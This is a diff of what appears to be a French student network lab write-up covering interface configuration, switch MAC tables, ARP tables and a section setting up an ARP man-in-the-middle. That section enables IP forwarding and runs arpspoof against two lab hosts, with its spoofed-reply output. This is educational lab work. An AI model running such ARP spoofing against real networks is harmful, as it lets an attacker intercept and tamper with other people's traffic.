@@ -4,7 +4,7 @@
 
     [rockylefragile@boxtp2 ~]$ sudo nano /etc/sysconfig/network-scripts/ifcfg-eth0
 
-### Contenu :
+
     DEVICE=eth0
     NAME=internet
 
@@ -12,9 +12,7 @@
     ONBOOT=yes
 #
     [rockylefragile@boxtp2 ~]$ sudo nano /etc/sysconfig/network-scripts/ifcfg-eth1
-
-### Contenu :
-
+#
     DEVICE=eth1
     NAME=lan
 
@@ -90,8 +88,8 @@
 
     Vlan    Mac Address       Type        Ports
     ----    -----------       --------    -----
-       1    0050.7966.6800    DYNAMIC     Et0/1
-       1    0c0a.7200.0001    DYNAMIC     Et0/0
+       1    0050.7966.7600    DYNAMIC     Et0/1
+       1    0c0a.8400.0001    DYNAMIC     Et0/0
     Total Mac Addresses for this criterion: 2
 
 # II - Serveur DHCP
@@ -191,7 +189,7 @@ bzez2.png à rajouter
 ```
     PC1> show arp
 
-    0c:e6:03:92:00:00  10.2.1.11 expires in 79 seconds
+    0c:e6:03:53:00:00  10.2.1.11 expires in 79 seconds
 ```
 ## Mettre en place un ARP MITM
 ```
@@ -200,7 +198,7 @@ bzez2.png à rajouter
     debianlefou@debian:~$ sudo sysctl -w net.ipv4.ip_forward=1
 
     debianlefou@debian:~$ sudo arpspoof -i ens4 -r -t 10.2.1.10 10.2.1.254
-    c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
+    c:e6:3:92:0:0 0:50:79:66:68:03 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
     c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
     c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
     c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
